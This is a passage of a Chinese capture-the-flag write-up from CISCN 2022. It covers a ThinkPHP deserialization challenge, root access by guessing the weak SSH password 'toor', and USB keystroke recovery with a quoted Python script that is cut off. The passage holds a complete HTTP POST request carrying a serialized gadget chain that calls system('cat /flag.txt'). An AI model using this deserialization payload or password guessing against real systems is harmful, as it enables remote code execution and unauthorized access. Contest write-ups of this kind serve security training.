style=color:#960050;background-color:#1e0010>;a</span>:<span style=color:#ae81ff>1</span>:{<span style=color:#960050;background-color:#1e0010>s:4:</span><span style=color:#f92672>&#34;test&#34;</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>13</span>:<span style=color:#e6db74>&#34;cat+/flag.txt&#34;</span><span style=color:#960050;background-color:#1e0010>;</span>}}<span style=color:#960050;background-color:#1e0010>s</span>:<span style=color:#ae81ff>21</span>:<span style=color:#e6db74>&#34;think\ModelwithAttr&#34;</span><span style=color:#960050;background-color:#1e0010>;a</span>:<span style=color:#ae81ff>1</span>:{<span style=color:#960050;background-color:#1e0010>s:4:</span><span style=color:#f92672>&#34;test&#34;</span><span style=color:#960050;background-color:#1e0010>;a</span>:<span style=color:#ae81ff>1</span>:{<span style=color:#960050;background-color:#1e0010>s:4:</span><span style=color:#f92672>&#34;test&#34;</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>6</span>:<span style=color:#e6db74>&#34;system&#34;</span><span style=color:#960050;background-color:#1e0010>;</span>}}<span style=color:#960050;background-color:#1e0010>s</span>:<span style=color:#ae81ff>7</span>:<span style=color:#e6db74>&#34;*json&#34;</span><span style=color:#960050;background-color:#1e0010>;a</span>:<span style=color:#ae81ff>1</span>:{<span style=color:#960050;background-color:#1e0010>i:0;s:4:</span><span style=color:#f92672>&#34;test&#34;</span><span style=color:#960050;background-color:#1e0010>;</span>}<span style=color:#960050;background-color:#1e0010>s</span>:<span style=color:#ae81ff>12</span>:<span style=color:#e6db74>&#34;*jsonAssoc&#34;</span><span style=color:#960050;background-color:#1e0010>;b</span>:<span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>12</span>:<span style=color:#e6db74>&#34;*withEvent&#34;</span><span style=color:#960050;background-color:#1e0010>;b</span>:<span style=color:#ae81ff>0</span><span style=color:#960050;background-color:#1e0010>;</span>}<span style=color:#960050;background-color:#1e0010>s</span>:<span style=color:#ae81ff>17</span>:<span style=color:#e6db74>&#34;think\Modeldata&#34;</span><span style=color:#960050;background-color:#1e0010>;a</span>:<span style=color:#ae81ff>1</span>:{<span style=color:#960050;background-color:#1e0010>s:4:</span><span style=color:#f92672>&#34;test&#34;</span><span style=color:#960050;background-color:#1e0010>;a</span>:<span style=color:#ae81ff>1</span>:{<span style=color:#960050;background-color:#1e0010>s:4:</span><span style=color:#f92672>&#34;test&#34;</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>13</span>:<span style=color:#e6db74>&#34;cat+/flag*&#34;</span><span style=color:#960050;background-color:#1e0010>;</span>}}<span style=color:#960050;background-color:#1e0010>s</span>:<span style=color:#ae81ff>21</span>:<span style=color:#e6db74>&#34;think\ModelwithAttr&#34;</span><span style=color:#960050;background-color:#1e0010>;a</span>:<span style=color:#ae81ff>1</span>:{<span style=color:#960050;background-color:#1e0010>s:4:</span><span style=color:#f92672>&#34;test&#34;</span><span style=color:#960050;background-color:#1e0010>;a</span>:<span style=color:#ae81ff>1</span>:{<span style=color:#960050;background-color:#1e0010>s:4:</span><span style=color:#f92672>&#34;test&#34;</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>6</span>:<span style=color:#e6db74>&#34;system&#34;</span><span style=color:#960050;background-color:#1e0010>;</span>}}<span style=color:#960050;background-color:#1e0010>s</span>:<span style=color:#ae81ff>7</span>:<span style=color:#e6db74>&#34;*json&#34;</span><span style=color:#960050;background-color:#1e0010>;a</span>:<span style=color:#ae81ff>1</span>:{<span style=color:#960050;background-color:#1e0010>i:0;s:4:</span><span style=color:#f92672>&#34;test&#34;</span><span style=color:#960050;background-color:#1e0010>;</span>}<span style=color:#960050;background-color:#1e0010>s</span>:<span style=color:#ae81ff>12</span>:<span style=color:#e6db74>&#34;*jsonAssoc&#34;</span><span style=color:#960050;background-color:#1e0010>;b</span>:<span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>;s</span>:<span style=color:#ae81ff>12</span>:<span style=color:#e6db74>&#34;*withEvent&#34;</span><span style=color:#960050;background-color:#1e0010>;b</span>:<span style=color:#ae81ff>0</span><span style=color:#960050;background-color:#1e0010>;</span>}
+</code></pre></div><ol start=6>
+<li>URL编码后post方法传入对象</li>
+</ol>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529134947949.png alt=image-20220529134947949>
+</p>
+<pre tabindex=0><code>POST http://eci-2zeayc165jl9fdxb7ezz.cloudeci1.ichunqiu.com/index.php/index/test HTTP/1.1
+Host: eci-2zeayc165jl9fdxb7ezz.cloudeci1.ichunqiu.com
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.62 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: ci_session=9bae6a3aa78f5d0b1d119d3803fc01d59d5ddba3; __jsluid_h=cb19eaa96eca8cfd4082513fec391da7
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1377
+
+a=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A13%3A%22cat+%2Fflag.txt%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A4%3A%22test%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A13%3A%22cat+%2Fflag.txt%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A4%3A%22test%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D
+
+</code></pre><h4 id=flag值-1>flag值：<a hidden class=anchor aria-hidden=true href=#flag值-1>#</a></h4>
+<pre tabindex=0><code class=language-flag data-lang=flag>flag{656d09d3-60d4-4410-ba78-a743f97df418}
+</code></pre><h3 id=3-基于挑战码的双向认证i和ii>3. 基于挑战码的双向认证I和II<a hidden class=anchor aria-hidden=true href=#3-基于挑战码的双向认证i和ii>#</a></h3>
+<h4 id=操作内容非预期解>操作内容(非预期解)<a hidden class=anchor aria-hidden=true href=#操作内容非预期解>#</a></h4>
+<p>进入root用户目录，查看<code>start.sh</code>文件内容，发现flag目录，直接cat获得两题的flag。</p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529131626726.png alt=image-20220529131626726>
+</p>
+<h4 id=flag值-2>flag值：<a hidden class=anchor aria-hidden=true href=#flag值-2>#</a></h4>
+<pre tabindex=0><code class=language-flag data-lang=flag>flag{6cc71f34-faal-4827-8480-22dc3659d90c}
+flag{34f5fdaf-c373-47fd-afab-01ed2914c1la}
+</code></pre><h3 id=4-基于挑战码的双向认证iii>4. 基于挑战码的双向认证III<a hidden class=anchor aria-hidden=true href=#4-基于挑战码的双向认证iii>#</a></h3>
+<h4 id=操作内容非预期解-1>操作内容（非预期解）<a hidden class=anchor aria-hidden=true href=#操作内容非预期解-1>#</a></h4>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529193844607.png alt=image-20220529193844607>
+</p>
+<p>连入ssh后，尝试爆破root用户常见弱口令</p>
+<p>尝试<code>toor</code>后，成功，获取root权限</p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529194032607.png alt=image-20220529194032607>
+</p>
+<p>拿到flag</p>
+<h4 id=flag值-3>flag值：<a hidden class=anchor aria-hidden=true href=#flag值-3>#</a></h4>
+<pre tabindex=0><code class=language-flag data-lang=flag>flag{7b352ef0-1bb1-41af-a7d7-b74f62ff23f0}
+</code></pre><h3 id=5-ez_usb>5. ez_usb<a hidden class=anchor aria-hidden=true href=#5-ez_usb>#</a></h3>
+<h4 id=操作内容-2>操作内容<a hidden class=anchor aria-hidden=true href=#操作内容-2>#</a></h4>
+<ol>
+<li>获取附件</li>
+<li>获取USB流量包</li>
+</ol>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529194423847.png alt=image-20220529194423847>
+</p>
+<p>将不同Source，Destination为host的流量包分开</p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/clip_image001.png alt="计算机生成了可选文字: #tong@ kali Is 2a11．pcapng 2a4．pcapng -hyperv 2a4a1 2a8a9 2a8a1 inN/miscl[18：49：15] ·pcapng ·pcapng ·pcapng ezusb.pcapng UsbKeyboarcNacker.py Ust<em>hc</em>acker.py">
+</p>
+<p>用下面提供的脚本对键盘按键进行分析</p>
+<p>获取内容如下：</p>
+<p>![计算机生成了可选文字: #tong@kali-hypervin•u/miscl[18：49：41] ，pythonUsbKeyboard4acker.py2a8a1．pcapng 刁UnknowKey： 刁UnknowKey。 刁UnknowKey：91 [刁UnknowKey：91 [+]Found 526172211a97e9〈CP>c〈CP>+987彐e9999 d99999999999999C4527424g4彐588彐e99999a2〈CP>a999999〈 CP>82b9f9bø5彐9778b5541d彐彐989a2e999999666C61672〈CP >e〈CP>747874〈CP>bgb〈CP>*I彐242f彐a〈CP>fc〈CP>e99 bß92c22gd6egg4167cø5〈CP>a7〈CP>8798b271f〈CP>fc〈C P>842ae彐d251e655彐6〈CP>fga〈CP>da87C774e6b67d9〈CP> e6彐16684766〈CP>a86e844d〈CP><a href=/CiscnWP.assets/%7D/clip_image001-16538246887091.png>81aa2〈CP>C72C71彐48d1 ec4<cap>c<del>3d7b<cap>øuøø7øø #tong@kali-hypervinN/miscl[18：：2彐] ，pythonUsbKeyboarcNacker.py2a1øa1.pcapng [+]Found：彐5C5彐5765e5ea74a #tong@kali-hypervinN/miscl[18：．49]</a></p>
+<p>其中分别为RAR文件与其解压密码</p>
+<p>解压后文件可得</p>
+<p>Flag：</p>
+<pre tabindex=0><code>flag{20de17cc-d2c1-4b61-bebd-41159ed7172d}
+</code></pre><h4 id=脚本代码>脚本代码<a hidden class=anchor aria-hidden=true href=#脚本代码>#</a></h4>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python</span>
+<span style=color:#f92672>import</span> sys
+<span style=color:#f92672>import</span> os
+DataFileName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;usb.dat&#34;</span>
+presses <span style=color:#f92672>=</span> []
+normalKeys <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;04&#34;</span>:<span style=color:#e6db74>&#34;a&#34;</span>, <span style=color:#e6db74>&#34;05&#34;</span>:<span style=color:#e6db74>&#34;b&#34;</span>, <span style=color:#e6db74>&#34;06&#34;</span>:<span style=color:#e6db74>&#34;c&#34;</span>, <span style=color:#e6db74>&#34;07&#34;</span>:<span style=color:#e6db74>&#34;d&#34;</span>, <span style=color:#e6db74>&#34;08&#34;</span>:<span style=color:#e6db74>&#34;e&#34;</span>, <span style=color:#e6db74>&#34;09&#34;</span>:<span style=color:#e6db74>&#34;f&#34;</span>, <span style=color:#e6db74>&#34;0a&#34;</span>:<span style=color:#e6db74>&#34;g&#34;</span>, <span style=color:#e6db74>&#34;0b&#34;</span>:<span style=color:#e6db74>&#34;h&#34;</span>, <span style=color:#e6db74>&#34;0c&#34;</span>:<span style=color:#e6db74>&#34;i&#34;</span>, <span style=color:#e6db74>&#34;0d&#34;</span>:<span style=color:#e6db74>&#34;j&#34;</span>, <span style=color:#e6db74>&#34;0e&#34;</span>:<span style=color:#e6db74>&#34;k&#34;</span>, <span style=color:#e6db74>&#34;0f&#34;</span>:<span style=color:#e6db74>&#34;l&#34;</span>, <span style=color:#e6db74>&#34;10&#34;</span>:<span style=color:#e6db74>&#34;m&#34;</span>, <span style=color:#e6db74>&#34;11&#34;</span>:<span style=color:#e6db74>&#34;n&#34;</span>, <span style=color:#e6db74>&#34;12&#34;</span>:<span style=color:#e6db74>&#34;o&#34;</span>, <span style=color:#e6db74>&#34;13&#34;</span>:<span style=color:#e6db74>&#34;p&#34;</span>, <span style=color:#e6db74>&#34;14&#34;</span>:<span style=color:#e6db74>&#34;q&#34;</span>, <span style=color:#e6db74>&#34;15&#34;</span>:<span style=color:#e6db74>&#34;r&#34;</span>, <span style=color:#e6db74>&#34;16&#34;</span>:<span style=color:#e6db74>&#34;s&#34;</span>, <span style=color:#e6db74>&#34;17&#34;</span>:<span style=color:#e6db74>&#34;t&#34;</span>, <span style=color:#e6db74>&#34;18&#34;</span>:<span style=color:#e6db74>&#34;u&#34;</span>, <span style=color:#e6db74>&#34;19&#34;</span>:<span style=color:#e6db74>&#34;v&#34;</span>, <span style=color:#e6db74>&#34;1a&#34;</span>:<span style=color:#e6db74>&#34;w&#34;</span>, <span style=color:#e6db74>&#34;1b&#34;</span>:<span style=color:#e6db74>&#34;x&#34;</span>, <span style=color:#e6db74>&#34;1c&#34;</span>:<span style=color:#e6db74>&#34;y&#34;</span>, <span style=color:#e6db74>&#34;1d&#34;</span>:<span style=color:#e6db74>&#34;z&#34;</span>,<span style=color:#e6db74>&#34;1e&#34;</span>:<span style=color:#e6db74>&#34;1&#34;</span>, <span style=color:#e6db74>&#34;1f&#34;</span>:<span style=color:#e6db74>&#34;2&#34;</span>, <span style=color:#e6db74>&#34;20&#34;</span>:<span style=color:#e6db74>&#34;3&#34;</span>, <span style=color:#e6db74>&#34;21&#34;</span>:<span style=color:#e6db74>&#34;4&#34;</span>, <span style=color:#e6db74>&#34;22&#34;</span>:<span style=color:#e6db74>&#34;5&#34;</span>, <span style=color:#e6db74>&#34;23&#34;</span>:<span style=color:#e6db74>&#34;6&#34;</span>,<span style=color:#e6db74>&#34;24&#34;</span>:<span style=color:#e6db74>&#34;7&#34;</span>,<span style=color:#e6db74>&#34;25&#34;</span>:<span style=color:#e6db74>&#34;8&#34;</span>,<span style=color:#e6db74>&#34;26&#34;</span>:<span style=color:#e6db74>&#34;9&#34;</span>,<span style=color:#e6db74>&#34;27&#34;</span>:<span style=color:#e6db74>&#34;0&#34;</span>,<span style=color:#e6db74>&#34;28&#34;</span>:<span style=color:#e6db74>&#34;&lt;RET&gt;&#34;</span>,<span style=color:#e6db74>&#34;29&#34;</span>:<span style=color:#e6db74>&#34;&lt;ESC&gt;&#34;</span>,<span style=color:#e6db74>&#34;2a&#34;</span>:<span style=color:#e6db74>&#34;&lt;DEL&gt;&#34;</span>, <span style=color:#e6db74>&#34;2b&#34;</span>:<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>&#34;2c&#34;</span>:<span style=color:#e6db74>&#34;&lt;SPACE&gt;&#34;</span>,<span style=color:#e6db74>&#34;2d&#34;</span>:<span style=color:#e6db74>&#34;-&#34;</span>,<span style=color:#e6db74>&#34;2e&#34;</span>:<span style=color:#e6db74>&#34;=&#34;</span>,<span style=color:#e6db74>&#34;2f&#34;</span>:<span style=color:#e6db74>&#34;[&#34;</span>,<span style=color:#e6db74>&#34;30&#34;</span>:<span style=color:#e6db74>&#34;]&#34;</span>,<span style=color:#e6db74>&#34;31&#34;</span>:<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>&#34;32&#34;</span>:<span style=color:#e6db74>&#34;&lt;NON&gt;&#34;</span>,<span style=color:#e6db74>&#34;33&#34;</span>:<span style=color:#e6db74>&#34;;&#34;</span>,<span style=color:#e6db74>&#34;34&#34;</span>:<span style=color:#e6db74>&#34;&#39;&#34;</span>,<span style=color:#e6db74>&#34;35&#34;</span>:<span style=color:#e6db74>&#34;&lt;GA&gt;&#34;</span>,<span style=color:#e6db74>&#34;36&#34;</span>:<span style=color:#e6db74>&#34;,&#34;</span>,<span style=color:#e6db74>&#34;37&#34;</span>:<span style=color:#e6db74>&#34;.&#34;</span>,<span style=color:#e6db74>&#34;38&#34;</span>:<span style=color:#e6db74>&#34;/&#34;</span>,<span style=color:#e6db74>&#34;39&#34;</span>:<span style=color:#e6db74>&#34;&lt;CAP&gt;&#34;</span>,<span style=color:#e6db74>&#34;3a&#34;</span>:<span style=color:#e6db74>&#34;&lt;F1&gt;&#34;</span>,<span style=color:#e6db74>&#34;3b&#34;</span>:<span style=color:#e6db74>&#34;&lt;F2&gt;&#34;</span>, <span style=color:#e6db74>&#34;3c&#34;</span>:<span style=color:#e6db74>&#34;&lt;F3&gt;&#34;</span>,<span style=color:#e6db74>&#34;3d&#34;</span>:<span style=color:#e6db74>&#34;&lt;F4&gt;&#34;</span>,<span style=color:#e6db74>&#34;3e&#34;</span>:<span style=color:#e6db74>&#34;&lt;F5&gt;&#34;</span>,<span style=color:#e6db74>&#34;3f&#34;</span>:<span style=color:#e6db74>&#34;&lt;F6&gt;&#34;</span>,<span style=color:#e6db74>&#34;40&#34;</span>:<span style=color:#e6db74>&#34;&lt;F7&gt;&#34;</span>,<span style=color:#e6db74>&#34;41&#34;</span>:<span style=color:#e6db74>&#34;&lt;F8&gt;&#34;</span>,<span style=color:#e6db74>&#34;42&#34;</span>:<span style=color:#e6db74>&#34;&lt;F9&gt;&#34;</span>,<span style=color:#e6db74>&#34;43&#34;</span>:<span style=color:#e6db74>&#34;&lt;F10&gt;&#34;</span>,<span style=color:#e6db74>&#34;44&#34;</span>:<span style=color:#e6db74>&#34;&lt;F11&gt;&#34;</span>,<span style=color:#e6db74>&#34;45&#34;</span>:<span style=color:#e6db74>&#34;&lt;F12&gt;&#34;</span>}
+shiftKeys <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;04&#34;</span>:<span style=color:#e6db74>&#34;A&#34;</span>, <span style=color:#e6db74>&#34;05&#34;</span>:<span style=color:#e6db74>&#34;B&#34;</span>, <span style=color:#e6db74>&#34;06&#34;</span>:<span style=color:#e6db74>&#34;C&#34;</span>, <span style=color:#e6db74>&#34;07&#34;</span>:<span style=color:#e6db74>&#34;D&#34;</span>, <span style=color:#e6db74>&#34;08&#34;</span>:<span style=color:#e6db74>&#34;E&#34;</span>, <span style=color:#e6db74>&#34;09&#34;</span>:<span style=color:#e6db74>&#34;F&#34;</span>, <span style=color:#e6db74>&#34;0a&#34;</span>:<span style=color:#e6db74>&#34;G&#34;</span>, <span style=color:#e6db74>&#34;0b&#34;</span>:<span style=color:#e6db74>&#34;H&#34;</span>, <span style=color:#e6db74>&#34;0c&#34;</span>:<span style=color:#e6db74>&#34;I&#34;</span>, <span style=color:#e6db74>&#34;0d&#34;</span>:<span style=color:#e6db74>&#34;J&#34;</span>, <span style=color:#e6db74>&#34;0e&#34;</span>:<span style=color:#e6db74>&#34;K&#34;</span>, <span style=color:#e6db74>&#34;0f&#34;</span>:<span style=color:#e6db74>&#34;L&#34;</span>, <span style=color:#e6db74>&#34;10&#34;</span>:<span style=color:#e6db74>&#34;M&#34;</span>, <span style=color:#e6db74>&#34;11&#34;</span>:<span style=color:#e6db74>&#34;N&#34;</span>, <span style=color:#e6db74>&#34;12&#34;</span>:<span style=color:#e6db74>&#34;O&#34;</span>, <span style=color:#e6db74>&#34;13&#34;</span>:<span style=color:#e6db74>&#34;P&#34;</span>, <span style=color:#e6db74>&#34;14&#34;</span>:<span style=color:#e6db74>&#34;Q&#34;</span>, <span style=color:#e6db74>&#34;15&#34;</span>:<span style=color:#e6db74>&#34;R&#34;</span>, <span style=color:#e6db74>&#34;16&#34;</span>:<span style=color:#e6db74>&#34;S&#34;</span>, <span style=color:#e6db74>&#34;17&#34;</span>:<span style=color:#e6db74>&#34;T&#34;</span>, <span style=color:#e6db74>&#34;18&#34;</span>:<span style=color:#e6db74>&#34;U&#34;</span>, <span style=color:#e6db74>&#34;19&#34;</span>:<span style=color:#e6db74>&#34;V&#34;</span>, <span style=color:#e6db74>&#34;1a&#34;</span>:<span style=color:#e6db74>&#34;W&#34;</span>, <span style=color:#e6db74>&#34;1b&#34;</span>:<span style=color:#e6db74>&#34;X&#34;</span>, <span style=color:#e6db74>&#34;1c&#34;</span>:<span style=color:#e6db74>&#34;Y&#34;</span>, <span style=color:#e6db74>&#34;1d&#34;</span>:<span style=color:#e6db74>&#34;Z&#34;</span>,<span style=color:#e6db74>&#34;1e&#34;</span>:<span style=color:#e6db74>&#34;!&#34;</span>, <span style=color:#e6db74>&#34;1f&#34;</span>:<span style=color:#e6db74>&#34;@&#34;</span>, <span style=color:#e6db74>&#34;20&#34;</span>:<span style=color:#e6db74>&#34;#&#34;</span>, <span style=color:#e6db74>&#34;21&#34;</span>:<span style=color:#e6db74>&#34;$&#34;</span>, <span style=color:#e6db74>&#34;22&#34;</span>:<span style=color:#e6db74>&#34;%&#34;</span>, <span style=color:#e6db74>&#34;23&#34;</span>:<span style=color:#e6db74>&#34;^&#34;</span>,<span style=color:#e6db74>&#34;24&#34;</span>:<span style=color:#e6db74>&#34;&amp;&#34;</span>,<span style=color:#e6db74>&#34;25&#34;</span>:<span style=color:#e6db74>&#34;*&#34;</span>,<span style=color:#e6db74>&#34;26&#34;</span>:<span style=color:#e6db74>&#34;(&#34;</span>,<span style=color:#e6db74>&#34;27&#34;</span>:<span style=color:#e6db74>&#34;)&#34;</span>,<span style=color:#e6db74>&#34;28&#34;</span>:<span style=color:#e6db74>&#34;&lt;RET&gt;&#34;</span>,<span style=color:#e6db74>&#34;29&#34;</span>:<span style=color:#e6db74>&#34;&lt;ESC&gt;&#34;</span>,<span style=color:#e6db74>&#34;2a&#34;</span>:<span style=color:#e6db74>&#34;&lt;DEL&gt;&#34;</span>, <span style=color:#e6db74>&#34;2b&#34;</span>:<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>&#34;2c&#34;</span>:<span style=color:#e6db74>&#34;&lt;SPACE&gt;&#34;</span>,<span style=color:#e6db74>&#34;2d&#34;</span>:<span style=color:#e6db74>&#34;_&#34;</span>,<span style=color:#e6db74>&#34;2e&#34;</span>:<span style=color:#e6db74>&#34;+&#34;</span>,<span style=color:#e6db74>&#34;2f&#34;</span>:<span style=color:#e6db74>&#34;{&#34;</span>,<span style=color:#e6db74>&#34;30&#34;</span>:<span style=color:#e6db74>&#34;}&#34;</span>,<span style=color:#e6db74>&#34;31&#34;</span>:<span style=color:#e6db74>&#34;|&#34;</span>,<span style=color:#e6db74>&#34;32&#34;</span>:<span style=color:#e6db74>&#34;&lt;NON&gt;&#34;</span>,<span style=color:#e6db74>&#34;33&#34;</span>:<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>&#34;34&#34;</span>:<span style=color:#e6db74>&#34;:&#34;</span>,<span style=color:#e6db74>&#34;35&#34;</span>:<span style=color:#e6db74>&#34;&lt;GA&gt;&#34;</span>,<span style=color:#e6db74>&#34;36&#34;</span>:<span style=color:#e6db74>&#34;&lt;&#34;</span>,<span style=color:#e6db74>&#34;37&#34;</span>:<span style=color:#e6db74>&#34;&gt;&#34;</span>,<span style=color:#e6db74>&#34;38&#34;</span>:<span style=color:#e6db74>&#34;?&#34;</span>,<span style=color:#e6db74>&#34;39&#34;</span>:<span style=color:#e6db74>&#34;&lt;CAP&gt;&#34;</span>,<span style=color:#e6db74>&#34;3a&#34;</span>:<span style=color:#e6db74>&#34;&lt;F1&gt;&#34;</span>,<span style=color:#e6db74>&#34;3b&#34;</span>:<span style=color:#e6db74>&#34;&lt;F2&gt;&#34;</span>, <span style=color:#e6db74>&#34;3c&#34;</span>:<span style=color:#e6db74>&#34;&lt;F3&gt;&#34;</span>,<span style=color:#e6db74>&#34;3d&#34;</span>:<span style=color:#e6db74>&#34;&lt;F4&gt;&#34;</span>,<span style=color:#e6db74>&#34;3e&#34;</span>:<span style=color:#e6db74>&#34;&lt;F5&gt;&#34;</span>,<span style=color:#e6db74>&#34;3f&#34;</span>:<span style=color:#e6db74>&#34;&lt;F6&gt;&#34;</span>,<span style=color:#e6db74>&#34;40&#34;</span>:<span style=color:#e6db74>&#34;&lt;F7&gt;&#34;</span>,<span style=color:#e6db74>&#34;41&#34;</span>:<span style=color:#e6db74>&#34;&lt;F8&gt;&#34;</span>,<span style=color:#e6db74>&#34;42&#34;</span>:<span style=color:#e6db74>&#34;&lt;F9&gt;&#34;</span>,<span style=color:#e6db74>&#34;43&#34;</span>:<span style=color:#e6db74>&#34;&lt;F10&gt;&#34;</span>,<span style=color:#e6db74>&#34;44&#34;</span>:<span style=color:#e6db74>&#34;&lt;F11&gt;&#34;</span>,<span style=color:#e6db74>&#34;45&#34;</span>:<span style=color:#e6db74>&#34;&lt;F12&gt;&#34;</span>}
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+    <span style=color:#75715e># check argv</span>
+    <span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span>:
+        print(<span style=color:#e6db74>&#34;Usage : &#34;</span>)
+        print(<span style=color:#e6db74>&#34;        python UsbKeyboardHacker.py data.pcap&#34;</span>)
+        print(<span style=color:#e6db74>&#34;Tips : &#34;</span>)
+        print(<span style=color:#e6db74>&#34;        To use this python script , you must install the tshark first.&#34;</span>)
+        print(<span style=color:#e6db74>&#34;        You can use `sudo apt-get install tshark` to install it&#34;</span>)
+        print(<span style=color:#e6db74>&#34;Author : &#34;</span>)
+        print(<span style=color:#e6db74>&#34;        WangYihang &lt;wangyihanger@gmail.com&gt;&#34;</span>)
+        print(<span style=color:#e6db74>&#34;        If you have any questions , please contact me by email.&#34;</span>)
+        print(<span style=color:#e6db74>&#34;        Thank you for using.&#34;</span>)
+        exit(<span style=color:#ae81ff>1</span>)
+    <span style=color:#75715e># get argv</span>
+    pcapFilePath <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]
+    
+    <span style=color:#75715e># get data of pcap</span>
+    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;tshark -r </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> -T fields -e usb.capdata &#39;usb.data_len == 8&#39; &gt; </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (pcapFilePath, DataFileName))
+    <span style=color:#75715e># read data</span>
+    <span style=color:#66d9ef>with</span> open(DataFileName, <span style=color:#e6db74>&#34;r&#34;</span>) <span style=color:#66d9ef>as</span> f:
+        <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> f:
+            presses<span style=color:#f92672>.</span>append(line[<span style=color:#ae81ff>0</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
+    <span style=color:#75715e># handle</span>
+    result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
+    <span style=color:#66d9ef>for</span> press <span style=color:#f92672>in</span> presses:
+        <span style=color:#66d9ef>if</span> press <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;&#39;</span>:
+            <span style=color:#66d9ef>continue</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;:&#39;</span> <span style=color:#f92672>in</span> press:
+            Bytes <span style=color:#f92672>=</span> press<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;:&#34;</span>)
+        <span style=color:#66d9ef>else</span>:
+            Bytes <span style=color:#f92672>=</span> [press[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(press), <span style=color:#ae81ff>2</span>)]
+        <span style=color:#66d9ef>if</span> Bytes[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;00&#34;</span>:
